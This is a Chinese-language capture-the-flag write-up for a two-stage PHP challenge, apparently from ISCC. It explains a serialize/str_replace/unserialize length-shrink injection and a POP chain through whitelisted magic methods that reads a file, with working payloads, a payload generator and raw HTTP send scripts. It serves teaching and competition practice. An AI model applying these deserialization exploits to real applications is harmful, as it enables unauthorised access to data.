# 数字古墓 -  WP

## 0. 题目整体判断

这道题是一个很典型的“两段式 PHP 反序列化”题。

题目首页的故事文案其实已经在暗示两件事：

- “前殿守着能够吞噬字符的文字陷阱”
  这通常对应字符串替换、过滤、长度变化之类的问题。
- “后殿则由一连串会自行苏醒的对象守卫看守”
  这通常对应 PHP 魔术方法链，也就是常说的 POP 链。

所以，拿到题目以后，我的第一反应不是去乱扫目录，而是：

1. 先把首页拿下来。
2. 看看有没有明显入口、参数、源码泄露。
3. 如果是 PHP 题，优先关注是否存在：
   - `highlight_file(__FILE__)`
   - `unserialize()`
   - 魔术方法 `__wakeup/__destruct/__toString/__get/__invoke`
   - 字符串替换、过滤、正则、白名单

这题的首页直接给了两个入口：

- `rune_trial.php`
- `mechanism_chamber.php`

这基本等于在告诉你：第一关拿线索，第二关拿最终结果。

---

## 1. 第一步：先把页面内容稳定拿到手

这道题所在端口对普通 `curl` 的行为不太友好，直接 `GET /` 有时会出现空响应。  
为了稳定分析，我写了一个最小化的原始 HTTP 探测脚本，通过 TCP 直接发 HTTP/1.0 请求。

脚本如下，文件名是 [probe_http.py](D:\edu\Darkwell\Game\ISCC\region_level\WEB(1)\probe_http.py)：

```python
import argparse
import socket
import sys


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="39.105.213.28")
    parser.add_argument("--port", type=int, default=10026)
    parser.add_argument("--method", default="GET")
    parser.add_argument("--path", default="/")
    parser.add_argument("--header", action="append", default=[])
    parser.add_argument("--data", default="")
    args = parser.parse_args()

    body = args.data.encode()
    headers = [
        f"{args.method} {args.path} HTTP/1.0",
        f"Host: {args.host}:{args.port}",
        "User-Agent: probe_http.py",
        "Accept: */*",
    ]
    if body:
        headers.append(f"Content-Length: {len(body)}")
        headers.append("Content-Type: application/x-www-form-urlencoded")
    headers.extend(args.header)
    req = ("\r\n".join(headers) + "\r\n\r\n").encode() + body

    with socket.create_connection((args.host, args.port), timeout=8) as sock:
        sock.sendall(req)
        chunks = []
        while True:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            chunks.append(chunk)
    sys.stdout.buffer.write(b"".join(chunks))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

使用方法很简单：

```powershell
python probe_http.py --path /
python probe_http.py --path /rune_trial.php
python probe_http.py --path /mechanism_chamber.php
```

这里最关键的不是脚本本身，而是思路：

- 如果普通工具不稳定，就自己控制请求格式。
- 做 Web 题时，拿到“稳定可复现”的请求方式很重要。

---

## 2. 首页告诉了我们什么

拿到 `/` 后，可以看到两个按钮：

- 第一阶段：`rune_trial.php`
- 第二阶段：`mechanism_chamber.php`

其中第一阶段按钮在前端被禁用了，但这是纯前端限制。  
对于 CTF Web 题，前端按钮是否能点，通常不重要，直接访问目标路径即可。

这里是一个很重要的入门经验：

> 只要后端路由真实存在，就不要被前端“禁用按钮”“弹窗提示”“按钮灰掉”吓住。

直接访问：

```powershell
python probe_http.py --path /rune_trial.php
python probe_http.py --path /mechanism_chamber.php
```

结果发现，两页都直接把自己的 PHP 源码高亮出来了。  
这一步其实已经说明：题目主战场不是目录扫描，而是源码审计。

---

## 3. 第一关总体思路：这是一个“替换后反序列化”题

先看第一关关键源码：

```php
class nameA {
    public $x;
    public $y;
    
    public function __construct($a, $b) {
        $this->x = $a;
        $this->y = $b;
    }
    
    public function __wakeup() {
        if ($this->y === 'admin123') {
            include('relic_manifest.php');
            echo "成功！文件名: " . $filename;
        }
    }
}

function p2($i) { 
    $key = "bnhpjowd"; 
    $search = '';
    for ($j = 0; $j < strlen($key); $j++) {
        $search .= chr(ord($key[$j]) - 1);
    }
    $replace = 'iscc';
    return str_replace($search, $replace, $i);
}

if (isset($_GET['d']) && isset($_GET['p'])) {
    $input = $_GET['d'];
    $passwd = $_GET['p'];
    if (strpos($input, 'amgoinvc') === false) {
        die('invalid input');
    }
    $obj = new nameA($input, $passwd);
    $ser = serialize($obj);
    $result = p1($ser);
    unserialize($result);
}
```

### 3.1 先把代码翻译成人话

后端做了这些事：

1. 你传入 `d` 和 `p`。
2. 要求 `d` 里面必须出现字符串 `amgoinvc`。
3. 程序把它们放进对象 `nameA($x, $y)`。
4. 把这个对象序列化。
5. 对序列化后的字符串做一次替换。
6. 再把替换后的字符串 `unserialize()` 回来。
7. 如果反序列化得到的对象里 `$y === 'admin123'`，就输出下一关线索。

所以这关真正的目标非常明确：

> 想办法让最终 `unserialize()` 时，对象里的 `y` 变成 `admin123`。

---

## 4. 第一关的关键漏洞点：字符串长度变了，但序列化长度标记没变

### 4.1 先算出替换内容

这一段：

```php
$key = "bnhpjowd";
for ($j = 0; $j < strlen($key); $j++) {
    $search .= chr(ord($key[$j]) - 1);
}
```

逐字符减 1：

- `b -> a`
- `n -> m`
- `h -> g`
- `p -> o`
- `j -> i`
- `o -> n`
- `w -> v`
- `d -> c`

所以 `$search` 就是：

```text
amgoinvc
```

然后：

```php
str_replace('amgoinvc', 'iscc', $serialized_string)
```

也就是：

- 原字符串长度 8
- 新字符串长度 4

每替换一次，总长度就会减少 4。

---

### 4.2 为什么这会危险

PHP 序列化字符串格式里，字符串会带长度，比如：

```php
s:8:"abcdefgh";
```

这里的 `8` 是长度标记。  
如果原来长度是 8，后来内容被替换成长度 4，但长度标记还是 8，那么反序列化时就会继续往后多吃 4 个字符。

这就是这类题的核心利用点：

> 替换造成“实际内容变短”，反序列化按“旧长度”继续读，于是后面的结构会被吞进去，导致对象属性边界错乱。

---

## 5. 第一关该怎么开始构造

### 5.1 先写出原本序列化后的结构

类 `nameA` 有两个公开属性 `x` 和 `y`，所以大致结构是：

```php
O:5:"nameA":2:{
    s:1:"x";s:len1:"<d>";
    s:1:"y";s:len2:"<p>";
}
```

如果我们能让 `x` 这个字符串在反序列化时“吞掉一部分后续内容”，就有机会把原本的 `y` 属性结构覆盖掉，重新伪造一个新的：

```php
s:1:"y";s:8:"admin123";
```

这就是第一关的总体构造方向。

---

### 5.2 为什么选 `d` 做文章

因为题目强制要求：

```php
strpos($input, 'amgoinvc') !== false
```

也就是说，`d` 必须带 `amgoinvc`。  
那就很自然想到：把替换压在 `d` 对应的 `x` 属性里。

每出现一次 `amgoinvc`，长度少 4。  
如果出现 4 次，就总共少：

```text
4 * 4 = 16
```

所以我先尝试让：

```text
d = amgoinvcamgoinvcamgoinvcamgoinvc
```

这样替换后会缩短 16 个字节。

---

## 6. 第一关最重要的理解：16 个字节要吞掉哪里

### 6.1 我们希望发生什么

理想情况是：

- `x` 原本声明的长度不变
- 实际内容缩短 16
- 于是反序列化读取 `x` 时，会从后面多读 16 个字符

这 16 个字符如果刚好覆盖到 `y` 前面的那段结构，就能把后面的 `p` 当成新的序列化内容拼进去。

常见想法是构造一个伪造尾巴，例如：

```text
;s:1:"y";s:8:"admin123";}
```

但注意，这个“伪造尾巴”放在哪里？  
答案是放进 `p`。

因为原结构是：

```text
... s:1:"x";s:32:"<d内容>";s:1:"y";s:<len>:"<p内容>";
```

如果 `x` 被多读 16 字节，就会把后面一部分 `;s:1:"y";s:...` 吞进去。  
只要吞到一个合适位置，后面的 `p` 内容就可以接上，形成新的合法属性结构。

---

### 6.2 为什么这里要让 `p` 以 `;s:1:"y"...` 开头

因为我们最终想让反序列化器看到的是：

```text
... "某个被截断后的x内容";s:1:"y";s:8:"admin123";}
```

也就是：

- 前面一部分还在给 `x` 收尾
- 后面开始伪造一个新的 `y`
- 然后把对象闭合掉

因此可以尝试令：

```text
p = ;s:1:"y";s:8:"admin123";}
```

但光这样还不够，因为序列化格式还会继续向后读，通常还需要填充一些无意义字符，让整体结构更稳定。

所以最终可以用：

```text
p = ;s:1:"y";s:8:"admin123";} + 大量填充字符
```

---

## 7. 第一关最终 payload 为什么成立

实际可用的构造是：

```text
d = amgoinvcamgoinvcamgoinvcamgoinvc
p = ;s:1:"y";s:8:"admin123";}AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

这里的核心不是死记这个 payload，而是理解：

### 7.1 `d` 的作用

`d` 放 4 个 `amgoinvc`，使 `x` 内容在替换后缩短 16 个字节。

### 7.2 `p` 的作用

`p` 不是拿来真的当“密码”的，而是拿来充当被错位拼接进去的“伪造序列化片段”。

### 7.3 这类题常见套路

看到下面这种结构就要警惕：

```php
serialize(...)
str_replace(...)
unserialize(...)
```

只要替换前后长度不一样，就高度可能存在可利用的反序列化错位问题。

---

## 8. 第一关如何发包验证

可以直接访问：

```text
/rune_trial.php?d=<payload1>&p=<payload2>
```

为了避免 URL 编码麻烦，我在 PowerShell 里这样发：

```powershell
$d='amgoinvcamgoinvcamgoinvcamgoinvc'
$p=';s:1:"y";s:8:"admin123";}' + ('A'*75)
$path='/rune_trial.php?d=' + [uri]::EscapeDataString($d) + '&p=' + [uri]::EscapeDataString($p)
python probe_http.py --path $path
```

成功后，页面会告诉你：

- 第一阶段通过
- 给出下一关要用到的一个 `.txt` 文件名

这里本文把这个文件名记作：

```text
<relic>.txt
```

我不在文档里直接写出真实值，避免把结果本身剧透掉。

到这里，第一关的目标就完成了。

---

## 9. 第二关总体思路：受限白名单下的 POP 链

第二关源码很长，但审题时不要一行一行硬看，应该先抓结构。

### 9.1 先看入口

```php
if (isset($_POST['data'])) {
    $input = $_POST['data'];
    $allowed = [
        'Chronicler',
        'RuneScribe',
        'RitualEngine',
        'GateSentinel',
        'Keystone',
    ];
    $data = @unserialize($input, ['allowed_classes' => $allowed]);
}
```

这说明：

1. 我们可以控 `$_POST['data']`
2. 后端会 `unserialize()`
3. 但只允许这 5 个类

所以思考方向就变成：

> 不要想着注入任意类，而是只在这 5 个类中拼出可利用的魔术方法链。

---

## 10. 第二关做题时的正确读法

面对这种题，不要通篇乱看。  
建议按下面顺序找：

1. 哪些类有魔术方法
2. 哪些魔术方法能自动触发
3. 哪些方法内部会调用别的方法
4. 最终哪里存在“敏感操作”

这题最敏感的操作在 `RitualEngine::run()`：

```php
public function run($file = null) {
    $baseDir = __DIR__;
    $name = $file ?: $this->target;
    if (!$name) {
        return;
    }
    if (!preg_match('/^[A-Za-z0-9_-]+\.txt$/', $name)) {
        return;
    }
    $path = $baseDir . DIRECTORY_SEPARATOR . $name;
    $real = realpath($path);
    if ($real === false) {
        return;
    }
    if (strpos($real, $baseDir . DIRECTORY_SEPARATOR) !== 0) {
        return;
    }
    if (@is_file($real) && @filesize($real) < 2048) {
        @highlight_file($real);
    }
}
```

这段代码的意义是：

- 它可以读取当前目录下的某个 `.txt` 文件
- 文件名只能是字母、数字、下划线、横线加 `.txt`
- 不能目录穿越
- 最后用 `highlight_file()` 输出内容

这其实已经非常接近“任意读当前目录下某个 txt 文件”。

而第一关刚好给了一个合法的 `.txt` 文件名。  
所以很自然想到：

> 第二关的目标就是想办法自动调用 `RitualEngine::run()`，并让它的 `target` 指向第一关得到的那个文件名。

---

## 11. 第二关先找可触发点

### 11.1 `GateSentinel::__wakeup`

```php
public function __wakeup() {
    if (preg_match("/\.\.|flag|etc/i", $this->object)) {
        $this->object = "index.html";
    }
}
```

这里有个很关键的点：

```php
preg_match(..., $this->object)
```

如果 `$this->object` 不是字符串，而是一个对象，那么 PHP 在很多场景下会尝试把它转成字符串，于是可能触发 `__toString()`。

所以我们立刻去找：谁有 `__toString()`？

---

### 11.2 `GateSentinel::__toString`

```php
public function __toString() {
    if (isset($this->tool['blade'])) {
        $this->tool['blade']->object;
    }
    return "GateSentinel";
}
```

这段表面看起来没做什么，但里面有一个非常重要的属性访问：

```php
$this->tool['blade']->object;
```

如果 `tool['blade']` 指向一个带 `__get()` 的对象，那么访问不存在属性 `object` 时，就会触发那个对象的 `__get()`。

于是继续找：谁有 `__get()`？

---

### 11.3 `Keystone::__get`

```php
public function __get($name) {
    $processor = $this->center;

    if (!is_object($processor)) {
        return null;
    }

    $safeClasses = ['RitualEngine', 'GateSentinel', 'RuneScribe', 'Chronicler', 'Keystone'];
    if (!in_array(get_class($processor), $safeClasses, true)) {
        return null;
    }

    if (is_callable($processor)) {
        return $processor();
    }

    return null;
}
```

这段意思是：

- `center` 必须是对象
- 类名必须在白名单里
- 如果它可调用，就执行 `$processor()`

什么对象可调用？  
实现了 `__invoke()` 的对象。

继续找：谁有 `__invoke()`？

---

### 11.4 `RitualEngine::__invoke`

```php
public function __invoke() {
    if (empty($this->callback)) {
        return;
    }

    $action = @unserialize($this->callback);
    
    if (!is_array($action) || count($action) !== 2) {
        return;
    }
    
    [$obj, $method] = $action;
    
    if (!($obj instanceof self)) {
        return;
    }

    if (!is_string($method)) {
        return;
    }

    $map = [
        'view' => 'run',
    ];

    if (!isset($map[$method])) {
        return;
    }

    $real = $map[$method];
    $obj->$real();
}
```

这就是整个第二关的核心。

它做了这些事：

1. 取出 `$this->callback`
2. 对它再次 `unserialize()`
3. 期望反序列化出一个长度为 2 的数组
4. 数组第一个元素必须是 `RitualEngine` 对象
5. 第二个元素必须是字符串
6. 如果第二个元素是 `"view"`，就映射成 `"run"`
7. 最后调用：

```php
$obj->run();
```

到这里，链条已经完整了。

---

## 12. 第二关整条利用链如何串起来

把前面的分析拼起来：

### 12.1 外层触发

`unserialize($_POST['data'])` 时，如果最外层对象是 `GateSentinel`，会自动触发：

```php
GateSentinel::__wakeup()
```

### 12.2 `__wakeup()` 里触发字符串化

它执行：

```php
preg_match(..., $this->object)
```

如果 `object` 是另一个对象，就有机会触发这个对象的：

```php
__toString()
```

### 12.3 `__toString()` 里触发属性访问

内层 `GateSentinel::__toString()` 执行：

```php
$this->tool['blade']->object;
```

如果 `tool['blade']` 是 `Keystone`，那么访问不存在属性 `object` 会触发：

```php
Keystone::__get('object')
```

### 12.4 `__get()` 里触发可调用对象

如果 `Keystone->center` 是 `RitualEngine`，并且它实现了 `__invoke()`，就会执行：

```php
$processor();
```

即触发：

```php
RitualEngine::__invoke()
```

### 12.5 `__invoke()` 里再还原一个数组

让 `callback` 反序列化为：

```php
[
    <某个 RitualEngine 对象>,
    "view"
]
```

这样 `"view"` 会映射成 `"run"`，最终执行：

```php
<那个 RitualEngine 对象>->run();
```

### 12.6 `run()` 读文件

只要这个对象的 `target` 是：

```text
<relic>.txt
```

就会把这个文件内容高亮输出。

---

## 13. 第二关为什么要用“两层 GateSentinel”

这是很多初学者最容易卡住的点。

### 13.1 为什么不能只放一层

因为我们需要：

1. 外层对象在 `unserialize()` 完成时自动进入 `__wakeup()`
2. 在 `__wakeup()` 里的 `preg_match()` 中，把某个“对象”当成字符串处理
3. 这样才能额外触发一次 `__toString()`

所以很自然的做法是：

- 外层：`GateSentinel`
- 外层的 `object`：再放一个 `GateSentinel`

于是流程是：

```text
外层 GateSentinel 反序列化
-> 外层 __wakeup
-> preg_match( ..., 内层 GateSentinel对象 )
-> 内层 __toString
-> ...
```

这就把“自动触发点”和“链条执行体”分开了。

---

## 14. 第二关 payload 结构怎么设计

推荐按“从最终目标反推”的方式搭。

### 14.1 最内层：真正读文件的 RitualEngine

我们需要一个 `RitualEngine` 对象，它的作用只有一个：

```php
$target = "<relic>.txt"
```

当它的 `run()` 被调用时，就会去读这个文件。

记作：

```text
RitualEngine(target="<relic>.txt")
```

---

### 14.2 再外一层：负责 `__invoke()` 的 RitualEngine

还需要另一个 `RitualEngine`，它本身不负责读文件，而是负责在 `__invoke()` 里解析 `callback`。

它的 `callback` 应该是一段序列化字符串，反序列化后得到：

```php
[
    <上面那个真正读文件的 RitualEngine>,
    "view"
]
```

因为 `"view"` 会被映射为 `"run"`。

记作：

```text
RitualEngine(callback=serialize([RitualEngine(target="<relic>.txt"), "view"]))
```

---

### 14.3 再外一层：Keystone

把 `Keystone->center` 指向那个带 `callback` 的 `RitualEngine`。

这样访问 `Keystone` 的不存在属性时，就会触发：

```php
Keystone::__get()
-> 调用 center()
-> 进入 RitualEngine::__invoke()
```

---

### 14.4 再外一层：内层 GateSentinel

把内层 `GateSentinel` 的：

- `object` 设为一个安全字符串，比如 `safe.txt`
- `tool['blade']` 设为上面的 `Keystone`

这样内层 `__toString()` 执行时：

```php
$this->tool['blade']->object;
```

就会触发整条链。

---

### 14.5 最外层：外层 GateSentinel

把最外层 `GateSentinel->object` 设为“内层 GateSentinel 对象”。

这样最外层在 `__wakeup()` 的 `preg_match()` 里就会把内层对象转成字符串，从而启动内层 `__toString()`。

---

## 15. 用代码生成第二关 payload

手写长序列化串很容易出错，教学上更推荐写个小生成器。

下面是我当时使用的生成逻辑：

```python
def s(x):
    return f's:{len(x)}:"{x}";'

def o(cls, props):
    body = ''.join(s(k) + v for k, v in props)
    return f'O:{len(cls)}:"{cls}":{len(props)}:{{{body}}}'

def arr_assoc(items):
    body = ''.join(s(k) + v for k, v in items)
    return f'a:{len(items)}:{{{body}}}'

def arr_idx(items):
    body = ''.join(f'i:{i};{v}' for i, v in enumerate(items))
    return f'a:{len(items)}:{{{body}}}'

real_reader = o('RitualEngine', [
    ('target', s('<relic>.txt')),
])

callback_array = arr_idx([
    real_reader,
    s('view'),
])

invoker = o('RitualEngine', [
    ('callback', s(callback_array)),
])

key = o('Keystone', [
    ('center', invoker),
])

inner_gate = o('GateSentinel', [
    ('object', s('safe.txt')),
    ('tool', arr_assoc([
        ('blade', key),
    ])),
])

outer_gate = o('GateSentinel', [
    ('object', inner_gate),
])

print(outer_gate)
```

这里有一个很重要的做题习惯：

> 不要逞强手写超长序列化串。能写生成器就写生成器。

因为只要长度算错一个数字，整个 payload 就会报废。

---

## 16. 第二关如何提交

入口要求的是：

```php
$_POST['data']
```

所以把生成出的序列化串做 URL 编码后，以表单形式 POST 即可。

例如在 PowerShell 里，可以拼成：

```powershell
$body = 'data=' + [uri]::EscapeDataString('<你的序列化串>')
python probe_http.py --method POST --path /mechanism_chamber.php --data $body
```

成功后，页面会输出目标 `.txt` 文件内容，也就是最终结果。  
本文按你的要求不直接展示最终 flag，只说明做到这里就已经拿到了答案。

---

## 17. 这题每一步“为什么会想到这里”

这一节专门给初学者，总结一下思考路径，而不是只背 payload。

### 17.1 看到首页按钮被禁用，为什么还是直接访问

因为前端限制不等于后端限制。  
CTF 里前端经常只是障眼法。

### 17.2 看到页面直接高亮源码，为什么优先审代码

因为源码泄露几乎等于题目把核心逻辑送到你眼前了。  
此时再去盲扫目录，收益通常不如直接读代码。

### 17.3 第一关为什么立刻想到“替换长度变化”

因为存在经典危险组合：

```php
serialize -> str_replace -> unserialize
```

只要替换前后长度不同，就要想到“字符串长度标记和真实长度不一致”。

### 17.4 第一关为什么盯着 `y === 'admin123'`

因为这是唯一明确的过关条件。  
做题时要先抓“目标状态”，再逆推怎么到达。

### 17.5 第二关为什么先找 `run()`

因为 `run()` 里有最敏感的操作：读文件。  
做 POP 链题，要先找“最终利用点”，再反推如何到达那个函数。

### 17.6 第二关为什么不怕白名单

因为白名单不是“无法利用”，只是“利用面缩小”。  
只要白名单内的类本身就能拼出链，照样能打。

### 17.7 第二关为什么要抓 `__wakeup/__toString/__get/__invoke`

因为这些魔术方法都属于“自动触发或半自动触发”的关键节点，能把一堆普通对象连成调用链。

---

## 18. 这题的核心知识点总结

### 18.1 第一关

- PHP 序列化字符串格式
- `str_replace()` 对序列化串的破坏
- 长度错位导致属性边界错乱
- 通过伪造片段覆盖对象属性

### 18.2 第二关

- `unserialize(..., ['allowed_classes' => ...])`
- 白名单类内的 POP 链构造
- `__wakeup`
- `__toString`
- `__get`
- `__invoke`
- 通过对象嵌套触发链条

---

## 19. 初学者做这类题的通用模板

以后遇到类似题目，可以按下面模板分析：

### 19.1 如果看到 `serialize -> replace -> unserialize`

先问自己：

1. 替换前后长度是否变化？
2. 哪个字段可控？
3. 能不能让某个字符串“少几个字节”？
4. 少掉的字节能不能吞掉后面的结构？
5. 最终想伪造哪个属性？

### 19.2 如果看到多类反序列化

先问自己：

1. 哪些类会自动触发魔术方法？
2. 哪个函数是最终危险点？
3. 能不能从 `__wakeup/__destruct` 起步？
4. 中途是否有 `__toString/__get/__call/__invoke` 可接力？
5. 白名单类中能不能闭环？

---

## 20. 最后一句话总结整题

这题本质上是：

- 第一关用“字符串替换导致的反序列化长度错位”，拿到第二关目标文件名。
- 第二关用“白名单类下的 POP 链”，把这个目标文件读出来。

如果只记答案，很快就会忘。  
但如果你记住了下面两句话，以后再遇到同类题就能自己想出来：

1. `serialize -> replace -> unserialize`，先想长度错位。
2. 反序列化多对象题，先找最终危险函数，再倒推魔术方法链。

